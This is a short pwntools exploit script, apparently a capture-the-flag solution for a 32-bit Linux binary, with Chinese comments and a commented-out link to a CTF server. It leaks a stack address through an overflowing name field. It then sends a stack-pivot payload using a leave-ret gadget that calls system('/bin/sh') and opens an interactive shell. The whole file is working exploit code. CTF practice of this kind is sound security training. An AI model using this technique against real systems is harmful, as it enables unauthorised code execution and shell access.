from pwn import *

context(arch='i386', os='linux', log_level='debug')

io = process('./fdfaa')  # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
# io = connect('6bdc715202e689e3ff7228f6.tcp-ctf2.dasctf.com',9999)              # 与在线环境交互。

system_addr = 0x08048400
leave_ret_addr = 0x08048562

io.recvuntil(b'Welcome, my friend. What\'s your name?\n')
payload = b'a' * 0x27 + b'b'
io.send(payload)

io.recvuntil(b'b')
ebp_addr = u32(io.recv(4))
s_addr = ebp_addr - 0x38
bin_sh_addr = ebp_addr - 0x28
print(hex(ebp_addr))

payload = b'aaaa' + p32(system_addr) + b'aaaa' + p32(bin_sh_addr) + b'/bin/sh\x00'
payload = payload.ljust(0x28, b'i')
payload += p32(s_addr) + p32(leave_ret_addr)
io.sendline(payload)

io.interactive()